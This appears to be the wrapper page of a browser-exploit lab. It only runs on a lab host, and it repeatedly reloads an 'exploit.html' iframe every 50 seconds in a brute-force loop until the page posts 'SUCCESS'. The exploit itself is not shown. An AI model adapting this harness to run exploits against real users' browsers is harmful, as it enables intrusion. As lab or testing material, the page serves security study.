<html>
    <head>
        <script>
            var interval = null;
            function exploitUrl() {
                const wrapperHost = window.location.hostname;
                if (!/^wrap-[a-z0-9-]+\.portal\.lab\.test$/i.test(wrapperHost)) {
                    throw new Error('expected wrap-<run-id>.portal.lab.test');
                }

                const exploitHost = wrapperHost.replace(/^wrap-/i, 'exp-');
                const port = window.location.port ? `:${window.location.port}` : '';
                return `${window.location.protocol}//${exploitHost}${port}/exploit.html`;
            }

            function iter() {
                let iframe = null;

                try {
                    iframe = document.getElementById('myframe');
                    document.body.removeChild(iframe);
                } catch (e) {}

                iframe = document.createElement('iframe');
                iframe.src = exploitUrl();
                iframe.id = 'myframe';
                document.body.appendChild(iframe);
                console.log(document.getElementById('myframe'));
                if (interval === null) {
                    interval = window.setInterval(iter, 50000);
                }
            }

            function brute() {
                iter();

                window.onmessage = function(e) {
                    if (e.data.includes('SUCCESS')) {
                        console.log('exploit successful');
                        window.clearInterval(interval);
                    }
                }
            }
        </script>
    </head>
    <body onload="brute()"></body>
</html>
